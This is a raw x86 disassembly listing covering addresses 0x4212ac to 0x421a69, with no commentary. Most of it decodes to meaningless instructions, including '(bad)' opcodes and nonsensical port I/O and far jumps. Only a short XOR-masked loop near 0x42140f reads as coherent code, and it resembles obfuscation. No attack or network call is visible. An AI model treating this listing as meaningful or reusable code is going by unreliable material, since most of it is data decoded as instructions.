  4212ac:	and    bh,BYTE PTR ds:0x9d9de2ef
  4212b2:	popf   
  4212b3:	and    ah,BYTE PTR [esi-0x6800483d]
  4212b9:	outs   dx,DWORD PTR ds:[esi]
  4212ba:	sar    BYTE PTR [ebx-0x33],1
  4212bd:	xchg   edi,eax
  4212be:	ret    
  4212bf:	pop    ss
  4212c0:	lods   al,BYTE PTR ds:[esi]
  4212c1:	jecxz  0x421292
  4212c3:	sub    BYTE PTR [eax],0xb4
  4212c6:	fcmovu st,st(4)
  4212c8:	out    dx,eax
  4212c9:	fadd   QWORD PTR [esi+0x2e]
  4212cc:	leave  
  4212cd:	daa    
  4212ce:	xor    al,0xc4
  4212d0:	mov    WORD PTR [ebx-0xe],ss
  4212d3:	dec    edx
  4212d4:	outs   dx,DWORD PTR ds:[esi]
  4212d5:	jo     0x4212db
  4212d7:	lods   al,BYTE PTR ds:[esi]
  4212d8:	mov    bl,0x83
  4212da:	popa   
  4212db:	out    0xc3,al
  4212dd:	test   BYTE PTR cs:[esi+ecx*1+0x6e],bh
  4212e2:	push   esi
  4212e3:	xchg   esi,eax
  4212e4:	fcomi  st,st(6)
  4212e6:	xor    edi,DWORD PTR [edi]
  4212e8:	push   0xffffff83
  4212ea:	xchg   edx,esp
  4212ec:	pop    edx
  4212ed:	jmp    0x421349
  4212ef:	ret    
  4212f0:	xchg   edx,eax
  4212f1:	out    dx,al
  4212f2:	in     eax,0xf8
  4212f4:	ins    DWORD PTR es:[edi],dx
  4212f5:	mov    edi,0x981e6e6b
  4212fa:	mov    edx,0x76f4afa5
  4212ff:	pop    es
  421300:	mov    ds:0x5574e35a,al
  421305:	cmp    BYTE PTR [ecx*1-0x2ef4b8aa],cl
  42130c:	test   eax,0xf7ddbc2c
  421311:	pop    ecx
  421312:	repz dec esi
  421314:	mov    WORD PTR [edx-0x7],es
  421317:	fs sub edx,esi
  42131a:	(bad)  
  42131b:	in     al,0xa2
  42131d:	xchg   ebp,eax
  42131e:	sub    eax,0x4a4bc836
  421323:	xchg   edi,ebp
  421325:	sub    BYTE PTR [ebx],dh
  421327:	in     al,dx
  421328:	jb     0x421394
  42132a:	mov    bh,0x2
  42132c:	xchg   edi,eax
  42132d:	inc    esp
  42132e:	pop    edx
  42132f:	cmp    DWORD PTR [esi*1-0x17739791],edx
  421336:	jnp    0x42135f
  421338:	pop    ebx
  421339:	repz push esi
  42133b:	(bad)  
  42133c:	out    0x2e,al
  42133e:	pop    ebx
  42133f:	shl    ah,1
  421341:	mov    dh,0x32
  421343:	out    0xf0,al
  421345:	jnp    0x4212ff
  421347:	mov    ah,0xf8
  421349:	sub    edi,DWORD PTR [eax+0x3f]
  42134c:	into   
  42134d:	test   DWORD PTR [ecx+ebp*1+0x1e],0x53bb01fc
  421355:	push   cs
  421356:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421357:	cdq    
  421358:	sub    al,0x2f
  42135a:	icebp  
  42135b:	adc    BYTE PTR [ecx+0xf6c83cb],al
  421361:	std    
  421362:	pop    ebp
  421363:	xor    DWORD PTR [esi+0x1f],edx
  421366:	fstp   QWORD PTR [esi-0x18]
  421369:	dec    esi
  42136a:	imul   edi,DWORD PTR [ebx+0x10],0x8afe5f26
  421371:	or     BYTE PTR [esi],0x76
  421374:	xor    eax,0x9d7ea4af
  421379:	xchg   edx,eax
  42137a:	sub    dl,bl
  42137c:	jg     0x421308
  42137e:	cs retf 0x7bcc
  421382:	in     eax,0x32
  421384:	sbb    al,0x81
  421386:	sub    dh,dl
  421388:	popf   
  421389:	fucompp 
  42138b:	mov    al,0x4f
  42138d:	xor    dl,ch
  42138f:	fistp  DWORD PTR [edi]
  421391:	out    0xe3,al
  421393:	xor    al,0xeb
  421395:	and    bl,ch
  421397:	jg     0x421375
  421399:	or     eax,DWORD PTR [ebx-0x1a]
  42139c:	mov    dl,0x70
  42139e:	mov    ?,WORD PTR [edi+0x120c2cb6]
  4213a4:	mov    BYTE PTR [esi+0x231a660a],cl
  4213aa:	push   edx
  4213ab:	(bad)
  4213af:	in     eax,dx
  4213b0:	inc    esp
  4213b1:	retf   
  4213b2:	(bad)  
  4213b4:	loope  0x42136f
  4213b6:	inc    esp
  4213b7:	jnp    0x4213b7
  4213b9:	(bad)  
  4213ba:	aas    
  4213bb:	add    ebp,ebx
  4213bd:	test   BYTE PTR [eax],cl
  4213bf:	sub    al,0x1a
  4213c1:	xor    al,0xc5
  4213c3:	xor    ch,BYTE PTR [edi+0x58f3cb41]
  4213c9:	sbb    ah,BYTE PTR [edi+eax*1]
  4213cc:	outs   dx,DWORD PTR ds:[esi]
  4213cd:	dec    edx
  4213ce:	mov    bh,0x6d
  4213d0:	push   0xffffffe0
  4213d2:	dec    ebp
  4213d3:	jmp    0x27bf853
  4213d8:	push   ebp
  4213d9:	imul   esi,ebp,0x50009c47
  4213df:	fcomip st,st(0)
  4213e1:	jne    0x421370
  4213e3:	ins    BYTE PTR es:[edi],dx
  4213e4:	add    DWORD PTR [esi-0x4d],esi
  4213e7:	xchg   ebx,eax
  4213e8:	popf   
  4213e9:	mov    DWORD PTR ds:0xe790ca49,ecx
  4213ef:	or     DWORD PTR [edi-0x33],eax
  4213f2:	jne    0x421376
  4213f4:	cmp    esi,esp
  4213f6:	xchg   ebx,eax
  4213f7:	push   es
  4213f8:	(bad)  
  4213fa:	or     ebx,DWORD PTR [edx+0x6a]
  4213fd:	mov    al,0xa0
  4213ff:	mov    ah,0x97
  421401:	clc    
  421402:	popa   
  421403:	cli    
  421404:	sub    ebp,DWORD PTR [ebx+0xe]
  421407:	mov    WORD PTR [eax],gs
  421409:	sbb    al,BYTE PTR [ebp+0x49163b9c]
  42140f:	mov    ecx,DWORD PTR [ebp+0x8]
  421412:	xor    ecx,eax
  421414:	add    ecx,esi
  421416:	jne    0x41f07f
  42141c:	jmp    0x421467
  421421:	mov    ecx,DWORD PTR [ebp+0x8]
  421424:	mov    edx,DWORD PTR [ebp-0x8]
  421427:	xor    ecx,eax
  421429:	xor    edx,eax
  42142b:	sub    ecx,edx
  42142d:	sub    ecx,esi
  42142f:	xor    ecx,eax
  421431:	mov    DWORD PTR [ebp+0x8],ecx
  421434:	mov    ecx,DWORD PTR [ebp+0x8]
  421437:	mov    edx,DWORD PTR [ebp+0x8]
  42143a:	xor    ecx,eax
  42143c:	imul   edx,edx,0x5708f5
  421442:	add    ecx,esi
  421444:	lea    ecx,[ebp+ecx*4-0x64]
  421448:	mov    edi,DWORD PTR [ecx]
  42144a:	add    edx,edi
  42144c:	mov    DWORD PTR [ecx],edx
  42144e:	mov    ecx,DWORD PTR [ebp+0x8]
  421451:	xor    ecx,eax
  421453:	add    ecx,esi
  421455:	jne    0x421421
  42145b:	mov    ecx,DWORD PTR [ebp-0x8]
  42145e:	xor    ecx,eax
  421460:	mov    eax,DWORD PTR [ebp+0x10]
  421463:	add    ecx,esi
  421465:	mov    DWORD PTR [eax],ecx
  421467:	pop    edi
  421468:	pop    esi
  421469:	pop    ebx
  42146a:	leave  
  42146b:	ret    0xc
  42146e:	pop    ss
  42146f:	or     al,0x84
  421471:	repz lahf 
  421473:	sti    
  421474:	ja     0x421462
  421476:	stos   BYTE PTR es:[edi],al
  421477:	mov    edx,0x524888e2
  42147c:	frstor [edx+0x77]
  42147f:	int    0x1
  421481:	add    BYTE PTR [ebx+0x0],ah
  421484:	add    BYTE PTR [eax],al
  421486:	sub    edx,DWORD PTR [edi+0x2a32a3c2]
  42148c:	scas   eax,DWORD PTR es:[edi]
  42148d:	fild   QWORD PTR [ecx-0x27fb9363]
  421493:	mov    dh,0xe6
  421495:	or     eax,0x2957c2ea
  42149a:	or     eax,0x188e65c7
  42149f:	out    dx,eax
  4214a0:	cmp    DWORD PTR [esi+edx*4-0x5c],esp
  4214a4:	cmp    DWORD PTR [edi],esi
  4214a6:	rcr    BYTE PTR [edi+0x3],cl
  4214a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4214aa:	xor    BYTE PTR [eax],cl
  4214ac:	push   0xfea1bccf
  4214b1:	sbb    al,0xf6
  4214b3:	adc    DWORD PTR [ebp-0x985e631],ebp
  4214b9:	or     BYTE PTR [eax+0x6da8b172],dh
  4214bf:	cmp    dh,0x68
  4214c2:	sub    BYTE PTR [edx],dh
  4214c4:	(bad)  
  4214c5:	icebp  
  4214c6:	pushf  
  4214c7:	inc    ebx
  4214c8:	mul    DWORD PTR [edi]
  4214ca:	sub    DWORD PTR [esp+ebx*4-0x34],ebp
  4214ce:	or     eax,eax
  4214d0:	out    dx,eax
  4214d1:	lods   eax,DWORD PTR ds:[esi]
  4214d2:	adc    eax,0x4ce0c7de
  4214d7:	xor    DWORD PTR [eax],ebx
  4214d9:	adc    ch,0x38
  4214dc:	xchg   esi,eax
  4214dd:	jge    0x42148e
  4214df:	sbb    eax,0xaee7df76
  4214e4:	cmp    dh,ah
  4214e6:	aad    0xb1
  4214e8:	adc    BYTE PTR [eax],al
  4214ea:	add    BYTE PTR [eax],al
  4214ec:	add    BYTE PTR [eax],al
  4214ee:	shr    DWORD PTR [esp+edx*1],1
  4214f1:	adc    edi,ebp
  4214f3:	cmp    edx,edi
  4214f5:	out    dx,al
  4214f6:	pop    edi
  4214f7:	xchg   bx,ax
  4214f9:	push   0xf182d0f6
  4214fe:	fcmove st,st(5)
  421500:	add    DWORD PTR [eax],eax
  421502:	arpl   WORD PTR [eax],ax
  421504:	add    BYTE PTR [eax],al
  421506:	stos   BYTE PTR es:[edi],al
  421507:	xor    al,0x47
  421509:	mov    ds:0x40acf046,eax
  42150e:	xchg   ebx,eax
  42150f:	int3   
  421510:	gs arpl cx,bp
  421513:	out    0x62,eax
  421515:	cmp    bh,al
  421517:	adc    al,0x93
  421519:	xor    al,0xa5
  42151b:	mov    bl,0x25
  42151d:	cmp    edi,ecx
  42151f:	hlt    
  421520:	fwait
  421521:	dec    eax
  421522:	inc    edi
  421523:	std    
  421524:	sbb    eax,DWORD PTR [ebx]
  421526:	sahf   
  421527:	ins    DWORD PTR es:[edi],dx
  421528:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421529:	adc    BYTE PTR [edx-0x78970988],bl
  42152f:	mov    ds,WORD PTR [eax+0x283cfd29]
  421535:	outs   dx,DWORD PTR ds:[esi]
  421536:	lahf   
  421537:	iret   
  421538:	jbe    0x421543
  42153a:	fimul  DWORD PTR [esi+0x76]
  42153d:	imul   esi,ebx,0xffffffb5
  421540:	leave  
  421541:	or     edx,edx
  421543:	out    dx,al
  421544:	and    ebx,DWORD PTR [edi+0x63]
  421547:	adc    eax,0x1eeb82a3
  42154c:	mov    cl,0xe2
  42154e:	lock aad 0x1a
  421551:	xchg   ebx,eax
  421552:	adc    al,0x79
  421554:	rol    BYTE PTR [esi+0xfe0616d],1
  42155a:	add    BYTE PTR [esi],bl
  42155c:	mov    al,ds:0xe98d245
  421561:	gs push ebp
  421563:	mov    dl,0xb1
  421565:	inc    esi
  421566:	jmp    0x421584
  421568:	out    0x0,al
  42156a:	add    BYTE PTR [eax],al
  42156c:	add    BYTE PTR [eax],al
  42156e:	pop    ds
  42156f:	sub    esp,DWORD PTR [eax-0x60404bc1]
  421575:	sub    eax,esi
  421577:	add    BYTE PTR [edi+eax*2+0x5114a0c],0x3d
  42157f:	into   
  421580:	add    DWORD PTR [eax],eax
  421582:	arpl   WORD PTR [eax],ax
  421584:	add    BYTE PTR [eax],al
  421586:	or     al,0x9c
  421588:	jmp    0x4215af
  42158a:	sub    eax,edx
  42158c:	add    ch,cl
  42158e:	je     0x421569
  421590:	imul   ebp,DWORD PTR [edi+0x9af4e2f],0xffffffab
  421597:	icebp  
  421598:	loope  0x4215d1
  42159a:	out    0x3c,al
  42159c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42159d:	pop    ebx
  42159e:	sub    DWORD PTR ds:0x11cee7e4,ecx
  4215a4:	or     BYTE PTR [edx-0x534836fa],0x9a
  4215ab:	jmp    0xc584:0x4230ac1a
  4215b2:	cs adc esi,eax
  4215b5:	jno    0x42162c
  4215b7:	cs inc edx
  4215b9:	mov    bh,0x94
  4215bb:	mov    ebx,0x9aa40ace
  4215c0:	inc    edi
  4215c1:	dec    edi
  4215c2:	adc    BYTE PTR [ecx],bl
  4215c4:	sar    DWORD PTR [ebx+0x22c53e13],cl
  4215ca:	aad    0xfd
  4215cc:	std    
  4215cd:	dec    edx
  4215ce:	out    dx,al
  4215cf:	lea    ebp,[eax]
  4215d1:	fild   WORD PTR [esp+eiz*8-0x68b38afb]
  4215d8:	mov    ebx,0xb02b3ef4
  4215dd:	in     eax,dx
  4215de:	push   esi
  4215df:	shr    BYTE PTR [ebp+0x4c3be446],cl
  4215e5:	(bad)  
  4215e6:	mov    ecx,0x782a
  4215eb:	add    BYTE PTR [eax],al
  4215ed:	add    BYTE PTR [edi],ch
  4215ef:	and    al,0xf0
  4215f1:	aam    0xfb
  4215f3:	aam    0x2f
  4215f5:	jmp    FWORD PTR [esi+0x33]
  4215f8:	je     0x4215b0
  4215fa:	mov    edi,0xa0326157
  4215ff:	into   
  421600:	add    DWORD PTR [eax],eax
  421602:	arpl   WORD PTR [eax],ax
  421604:	add    BYTE PTR [eax],al
  421606:	mov    bl,0x34
  421608:	adc    al,0xa9
  42160a:	out    dx,eax
  42160b:	rcr    BYTE PTR [edi-0x60ca61dd],0x8e
  421612:	(bad)  
  421613:	scas   eax,DWORD PTR es:[edi]
  421614:	push   eax
  421615:	adc    eax,0xe696b28d
  42161a:	adc    BYTE PTR [ecx],cl
  42161c:	mov    eax,ds:0xbf19f69e
  421621:	cdq    
  421622:	inc    esp
  421623:	jecxz  0x4215d1
  421625:	stos   BYTE PTR es:[edi],al
  421626:	(bad)  [edx]
  421628:	xchg   edx,eax
  421629:	mov    ebp,0xc7a936c4
  42162e:	lds    ebp,FWORD PTR [esi-0x668dc598]
  421634:	sub    DWORD PTR [eax-0x2f],ebx
  421637:	and    eax,0x5c4bbb7a
  42163c:	dec    ecx
  42163d:	sub    dl,BYTE PTR [edi]
  42163f:	fdiv   QWORD PTR [edx]
  421641:	sbb    DWORD PTR [ecx-0x79a30cb8],edi
  421647:	jae    0x4216b6
  421649:	push   0x92c6bded
  42164e:	cli    
  42164f:	inc    esp
  421650:	nop
  421651:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421652:	adc    ebx,DWORD PTR [ebx+0x2c8045a1]
  421658:	xor    al,0x3c
  42165a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42165b:	loop   0x421648
  42165d:	jne    0x4215f4
  42165f:	jle    0x421688
  421661:	pop    DWORD PTR [ebx+0x513008ba]
  421667:	adc    BYTE PTR [ecx],cl
  421669:	add    BYTE PTR [eax],al
  42166b:	add    BYTE PTR [eax],al
  42166d:	add    dl,cl
  42166f:	mov    al,ds:0xdf7e4d76
  421674:	sti    
  421675:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421676:	mov    bh,0x83
  421678:	dec    edi
  421679:	mov    ds:0xa5e938b2,al
  42167e:	add    ecx,edi
  421680:	add    DWORD PTR [eax],eax
  421682:	arpl   WORD PTR [eax],ax
  421684:	add    BYTE PTR [eax],al
  421686:	dec    edi
  421687:	dec    edi
  421688:	enter  0xdd5,0xf0
  42168c:	or     al,0xbc
  42168e:	pop    ecx
  42168f:	mov    dh,0xa8
  421691:	ds or  eax,0x49fb1467
  421697:	xchg   esi,eax
  421698:	call   0x9eff:0xffd39c6c
  42169f:	fsubr  QWORD PTR [edx+ebp*1]
  4216a2:	dec    ebp
  4216a3:	adc    esp,DWORD PTR [esi+0x185b96b]
  4216a9:	sbb    esp,0xffffffc1
  4216ac:	jb     0x421664
  4216ae:	mov    bh,0x60
  4216b0:	scas   al,BYTE PTR es:[edi]
  4216b1:	add    BYTE PTR [ebx],al
  4216b3:	mov    esi,0x72dd7561
  4216b8:	aam    0x1e
  4216ba:	push   0x73
  4216bc:	(bad)  
  4216bd:	pop    esi
  4216be:	cwde   
  4216bf:	cmc    
  4216c0:	push   ebp
  4216c1:	adc    al,0xdd
  4216c3:	and    eax,DWORD PTR [ebx+0x47]
  4216c6:	dec    BYTE PTR [edx+0x672271ec]
  4216cc:	dec    ebx
  4216cd:	ret    
  4216ce:	loopne 0x4216fd
  4216d0:	loope  0x42165a
  4216d2:	shl    DWORD PTR [eax+0x2e],1
  4216d5:	shl    DWORD PTR ds:0xec89b309,0x21
  4216dc:	ss call 0x3dc8:0xe779ecf
  4216e4:	in     al,dx
  4216e5:	fdivr  QWORD PTR [esi-0x8]
  4216e8:	add    DWORD PTR [eax],0x0
  4216eb:	add    BYTE PTR [eax],al
  4216ed:	add    dh,al
  4216ef:	out    dx,al
  4216f0:	lods   al,BYTE PTR ds:[esi]
  4216f1:	cmp    ch,BYTE PTR [edx+edi*2+0x5223fed6]
  4216f8:	stc    
  4216f9:	stc    
  4216fa:	lds    esi,FWORD PTR [eax+0x23]
  4216fd:	pcmpgtd mm1,mm7
  421700:	add    DWORD PTR [eax],eax
  421702:	arpl   WORD PTR [eax],ax
  421704:	add    BYTE PTR [eax],al
  421706:	repnz lods eax,DWORD PTR ds:[esi]
  421708:	into   
  421709:	(bad)  
  42170b:	stc    
  42170c:	icebp  
  42170d:	icebp  
  42170e:	outs   dx,BYTE PTR ds:[esi]
  42170f:	inc    esp
  421710:	xor    BYTE PTR ds:[eax+0x4fa47f38],bh
  421717:	mov    al,0x89
  421719:	push   cs
  42171a:	test   al,0xf8
  42171c:	and    al,0xe7
  42171e:	test   eax,0xe298b679
  421723:	shr    bl,0x76
  421726:	jne    0x421708
  421728:	scas   eax,DWORD PTR es:[edi]
  421729:	cmp    dl,BYTE PTR [esi-0x35a57891]
  42172f:	ret    0xd5de
  421732:	adc    DWORD PTR [ecx+0x7419f6bc],0x4a
  421739:	(bad)  
  42173a:	(bad)  
  42173c:	adc    al,0x55
  42173e:	xor    cl,BYTE PTR [ebx*8+0x56851f89]
  421745:	mov    esp,0x3b74bf8d
  42174a:	mov    edx,0x692ace1a
  42174f:	not    DWORD PTR [esi-0x184e539e]
  421755:	loopne 0x4216e6
  421757:	imul   ebx,DWORD PTR [edi+0x38],0xffffff95
  42175b:	sub    BYTE PTR [edi-0x1f4f8cde],0x28
  421762:	daa    
  421763:	jb     0x42179f
  421765:	xchg   DWORD PTR [eax],esi
  421767:	idiv   BYTE PTR [esi+0x0]
  42176d:	add    BYTE PTR [edx+0x34],dl
  421770:	inc    eax
  421771:	gs data16 jne 0x4217ec
  421775:	aaa    
  421776:	push   0xe76a4e09
  42177b:	(bad)  [ecx]
  42177d:	mov    bh,0xc9
  42177f:	iret   
  421780:	add    DWORD PTR [eax],eax
  421782:	arpl   WORD PTR [eax],ax
  421784:	add    BYTE PTR [eax],al
  421786:	lods   eax,DWORD PTR ds:[esi]
  421787:	xor    eax,0x1ee61f90
  42178c:	cmp    eax,0x7bcd8deb
  421791:	jge    0x421734
  421793:	fnsave fs:[ecx]
  421796:	gs inc ebx
  421798:	aad    0xb5
  42179a:	inc    ebp
  42179b:	pop    ebp
  42179c:	push   ss
  42179d:	scas   eax,DWORD PTR es:[edi]
  42179e:	jmp    0x81c90ff9
  4217a3:	jmp    0x4217ba
  4217a5:	in     eax,0xd
  4217a7:	adc    BYTE PTR [ecx+0x36d482ba],ah
  4217ad:	out    0xd2,eax
  4217af:	mov    dl,0xfe
  4217b1:	sub    eax,0xffc72d55
  4217b6:	sbb    BYTE PTR cs:[edx-0x3358ef5a],0x81
  4217be:	and    al,0x5f
  4217c0:	(bad)  
  4217c1:	add    DWORD PTR [edx],esp
  4217c3:	icebp  
  4217c4:	in     eax,0x39
  4217c6:	mov    eax,ds:0xe6c32cb9
  4217cb:	mov    dh,0x31
  4217cd:	data16 into 
  4217cf:	sar    bl,cl
  4217d1:	pop    ds
  4217d2:	shr    DWORD PTR [edx+0xa8de30b],1
  4217d8:	sbb    al,0x2f
  4217da:	mov    esp,0xc52a0de
  4217df:	jnp    0x421824
  4217e1:	lods   eax,DWORD PTR ds:[esi]
  4217e2:	jne    0x4217df
  4217e4:	jno    0x4217b4
  4217e6:	aaa    
  4217e7:	out    dx,eax
  4217e8:	arpl   WORD PTR [eax],ax
  4217ea:	add    BYTE PTR [eax],al
  4217ec:	add    BYTE PTR [eax],al
  4217ee:	adc    bh,BYTE PTR [edx-0x19073928]
  4217f4:	push   ds
  4217f5:	(bad)  
  4217f6:	adc    bl,dh
  4217f8:	cwde   
  4217f9:	out    dx,al
  4217fa:	popa   
  4217fb:	inc    edi
  4217fc:	push   ss
  4217fd:	cwde   
  4217fe:	mov    esp,0x630001e2
  421803:	add    BYTE PTR [eax],al
  421805:	add    BYTE PTR [ebx],bl
  421807:	popa   
  421808:	out    0xe7,al
  42180a:	sbb    eax,0x3602413c
  42180f:	stos   BYTE PTR es:[edi],al
  421810:	cld    
  421811:	test   BYTE PTR [eax],ah
  421813:	sub    edx,DWORD PTR [ecx-0x4e]
  421816:	xor    al,0x75
  421818:	mov    dl,BYTE PTR [ecx+0x2b]
  42181b:	mov    dl,bl
  42181d:	stc    
  42181e:	(bad)  
  42181f:	add    al,0xe6
  421821:	adc    ebp,DWORD PTR [edi]
  421823:	mov    eax,ds:0xd56f3c35
  421828:	ss out 0xb3,al
  42182b:	or     dl,BYTE PTR [ebx-0x3a]
  42182e:	push   0x4eda36e3
  421833:	out    0x3,eax
  421835:	and    DWORD PTR [edi],edi
  421837:	inc    ebp
  421838:	sbb    eax,0xff1c8593
  42183d:	(bad)  
  42183e:	xor    bh,bl
  421840:	xor    al,0x22
  421842:	lea    eax,[esp+ebp*4+0xa7fb21a]
  421849:	mov    bl,0x3c
  42184b:	adc    DWORD PTR [edi],edi
  42184d:	mov    ?,WORD PTR ds:[esp+edx*8]
  421851:	cmp    eax,0x59c43edf
  421856:	adc    al,0x8b
  421858:	cld    
  421859:	fnsave [ebp-0x79c0a350]
  42185f:	push   edx
  421860:	int3   
  421861:	inc    edx
  421862:	sbb    eax,0xc7de69c2
  421867:	push   ds
  421868:	lods   eax,DWORD PTR ds:[esi]
  421869:	add    BYTE PTR [eax],al
  42186b:	add    BYTE PTR [eax],al
  42186d:	add    BYTE PTR [ecx+0x46],cl
  421870:	sub    BYTE PTR [eax],dh
  421872:	das    
  421873:	jle    0x4218ce
  421875:	jg     0x42183d
  421877:	imul   esi,eax,0xffffffd5
  42187a:	(bad)  
  42187b:	sbb    eax,edi
  42187d:	xor    BYTE PTR [edi],bl
  42187f:	jecxz  0x421882
  421881:	add    BYTE PTR [ebx+0x0],ah
  421884:	add    BYTE PTR [eax],al
  421886:	lock mov ebx,0xd49cbdb9
  42188c:	lahf   
  42188d:	adc    BYTE PTR [edx+0x46],0xf6
  421891:	push   eax
  421892:	or     BYTE PTR ds:0xf0f95412,0x7d
  421899:	fwait
  42189a:	sbb    eax,0x43f26dc6
  42189f:	push   esi
  4218a0:	jno    0x421894
  4218a2:	push   ecx
  4218a3:	mov    ah,0xc2
  4218a5:	cmp    eax,0xc314a752
  4218aa:	mov    ds:0xfb35b800,eax
  4218af:	pop    edi
  4218b0:	fistp  QWORD PTR [edx]
  4218b2:	xlat   BYTE PTR fs:[ebx]
  4218b4:	mov    dl,0x3d
  4218b6:	leave  
  4218b7:	pop    es
  4218b8:	xchg   esp,eax
  4218b9:	jne    0x42190e
  4218bb:	into   
  4218bc:	popf   
  4218bd:	push   esi
  4218be:	add    eax,0xad853d3e
  4218c3:	dec    edi
  4218c4:	int3   
  4218c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4218c6:	bound  edx,QWORD PTR [esp+ebx*1]
  4218c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4218ca:	nop
  4218cb:	fist   DWORD PTR es:[ecx]
  4218ce:	imul   BYTE PTR [edi+0x52edf816]
  4218d4:	pop    ebx
  4218d5:	adc    edi,DWORD PTR [ebx-0x3e4b5c5]
  4218db:	ins    DWORD PTR es:[edi],dx
  4218dc:	push   ds
  4218dd:	out    0x99,eax
  4218df:	xchg   edi,eax
  4218e0:	mov    ?,WORD PTR [esi+0x3]
  4218e3:	xor    BYTE PTR [esp+ebx*2+0x60084d],0x0
  4218eb:	add    BYTE PTR [eax],al
  4218ed:	add    BYTE PTR [edi-0x3a],ah
  4218f0:	and    dh,dh
  4218f2:	mov    eax,ds:0xe7d7f7f6
  4218f7:	mov    eax,0x41d8da72
  4218fc:	pop    ebx
  4218fd:	ja     0x421881
  4218ff:	jecxz  0x421902
  421901:	add    BYTE PTR [ebx+0x0],ah
  421904:	add    BYTE PTR [eax],al
  421906:	(bad)  
  421908:	jo     0x42191d
  42190a:	mov    ds:0x23130b61,eax
  42190f:	jns    0x421968
  421911:	and    eax,0x78de89cd
  421916:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421917:	or     BYTE PTR [edx-0x5a9710a2],dh
  42191d:	je     0x4218a3
  42191f:	and    eax,0x479888a6
  421924:	dec    edx
  421925:	lahf   
  421926:	aam    0xfa
  421928:	dec    esp
  421929:	jl     0x42191a
  42192b:	ss push eax
  42192d:	pop    eax
  42192e:	sub    DWORD PTR ds:0x92930f89,esi
  421934:	jle    0x421945
  421936:	iret   
  421937:	inc    ebx
  421938:	mov    edi,0x97d9fdf5
  42193d:	test   al,0x3b
  42193f:	into   
  421940:	mov    cl,0x45
  421942:	dec    edx
  421943:	(bad)  
  421945:	add    eax,0x954d12ed
  42194a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42194b:	std    
  42194c:	loope  0x421962
  42194e:	nop
  42194f:	inc    ebp
  421950:	fst    DWORD PTR [edx]
  421952:	cli    
  421953:	lock xchg esp,eax
  421955:	shl    DWORD PTR [edx-0x7d],0xb1
  421959:	scas   al,BYTE PTR es:[edi]
  42195a:	aad    0xd2
  42195c:	enter  0x2ec4,0xc8
  421960:	ret    0x4418
  421963:	xchg   ebx,eax
  421964:	push   esi
  421965:	icebp  
  421966:	aaa    
  421967:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421968:	imul   eax,DWORD PTR [eax],0x0
  42196e:	ret    
  42196f:	or     eax,0xefee66a6
  421974:	ret    
  421975:	lods   eax,DWORD PTR ds:[esi]
  421976:	sub    al,0xb8
  421978:	mov    ds:0xc69d5f47,eax
  42197d:	xor    ah,ch
  42197f:	jecxz  0x421982
  421981:	add    BYTE PTR [ebx+0x0],ah
  421984:	add    BYTE PTR [eax],al
  421986:	pop    eax
  421987:	sub    al,BYTE PTR [eax+0x7f]
  42198a:	dec    esi
  42198b:	cmp    DWORD PTR [edx+edx*1-0x1a8295f2],esp
  421992:	mov    dh,0x9f
  421994:	push   esi
  421995:	and    al,0xe7
  421997:	daa    
  421998:	xor    al,BYTE PTR [ecx+0x44]
  42199b:	pop    edx
  42199c:	jp     0xae4eff58
  4219a2:	outs   dx,BYTE PTR ds:[esi]
  4219a3:	fist   DWORD PTR [esi+0x2e]
  4219a6:	and    ebp,esp
  4219a8:	arpl   WORD PTR [eax+0x4c],ax
  4219ab:	int3   
  4219ac:	mov    edi,0xd3e8c3a9
  4219b2:	xchg   esp,eax
  4219b3:	stos   DWORD PTR es:[edi],eax
  4219b4:	fisub  DWORD PTR [esi-0x2275165c]
  4219ba:	pop    edx
  4219bb:	mov    cl,0xba
  4219bd:	ss lock rcr BYTE PTR gs:[ebx+0x16],1
  4219c3:	mov    bh,BYTE PTR [esi-0x28206c8c]
  4219c9:	repz mov al,ds:0xa8b69007
  4219cf:	nop
  4219d0:	test   al,0xf8
  4219d2:	xchg   bl,cl
  4219d4:	pop    ss
  4219d5:	dec    esp
  4219d6:	adc    bh,dh
  4219d8:	push   edi
  4219d9:	mov    edi,0xb263736e
  4219de:	cli    
  4219df:	call   0x81a3d3f1
  4219e4:	push   esp
  4219e5:	sar    DWORD PTR [eax-0x74],0xb2
  4219e9:	add    BYTE PTR [eax],al
  4219eb:	add    BYTE PTR [eax],al
  4219ed:	add    cl,bl
  4219ef:	ret    0x4905
  4219f2:	pop    ds
  4219f3:	iret   
  4219f4:	fst    st(2)
  4219f6:	enter  0xf86f,0xd2
  4219fa:	xor    al,0xe3
  4219fc:	ja     0x421a67
  4219fe:	dec    eax
  4219ff:	in     al,0x1
  421a01:	add    BYTE PTR [eax+0x0],dl
  421a04:	add    BYTE PTR [eax],al
  421a06:	fstp   QWORD PTR [edx+0x51]
  421a09:	repnz mov dh,0x7c
  421a0c:	inc    ecx
  421a0d:	or     DWORD PTR [edi-0x512d4d46],esp
  421a13:	in     eax,dx
  421a14:	add    BYTE PTR [esi*8+0x4af635b9],ah
  421a1b:	shr    eax,cl
  421a1d:	adc    eax,0xe5d4aeb3
  421a22:	adc    esp,edi
  421a24:	mov    esi,0x2d16969
  421a29:	xor    DWORD PTR [edx+0x768933ba],ebx
  421a2f:	(bad)  
  421a30:	loop   0x4219f1
  421a32:	popa   
  421a33:	cld    
  421a34:	test   edx,eax
  421a36:	push   ds
  421a37:	fwait
  421a38:	jecxz  0x4219d4
  421a3a:	cli    
  421a3b:	mov    WORD PTR [edi-0x3ddb670a],?
  421a41:	arpl   bp,bp
  421a43:	or     edx,DWORD PTR [ebx-0x43]
  421a46:	lea    edx,[edi]
  421a48:	mov    bl,0x25
  421a4a:	sbb    cl,BYTE PTR [esi-0x54]
  421a4d:	jbe    0x421a77
  421a4f:	iret   
  421a50:	test   DWORD PTR [ebx+0x18f36ea6],esp
	...
  421a5e:	add    BYTE PTR [eax-0x6ffbffbe],dl
  421a64:	inc    edx
  421a65:	add    BYTE PTR [eax],cl
  421a67:	nop
  421a68:	inc    edx
  421a69:	add    BYTE PTR [eax+edx*4],cl
